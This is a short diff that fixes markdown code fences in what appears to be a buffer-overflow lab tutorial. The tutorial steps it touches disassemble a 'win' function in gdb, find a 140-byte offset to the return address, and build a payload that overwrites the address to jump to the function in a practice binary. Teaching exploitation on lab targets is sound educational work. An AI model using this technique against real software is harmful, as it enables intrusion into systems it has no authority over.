@@ -36,13 +36,15 @@ A binary is just bytes. Memory corruption works the same everywhere. The OS does
 ```bash
 gdb vuln.exe
 (gdb) disas win
+```
 Output:
 
-text
+```text
 Dump of assembler code for function win:
    0x00401530 <+0>:     push   ebp
    0x00401531 <+1>:     mov    ebp,esp
    ...
+```
 Win address: 0x00401530
 
 Step 2: Find the offset
@@ -51,5 +53,6 @@ Cause a crash, inspect the crash address.
 Offset: 140 bytes to return address.
 
 Step 3: Craft the payload
-text
+```text
 payload = b'A'*140 + b'\x30\x15\x40\x00'
+```
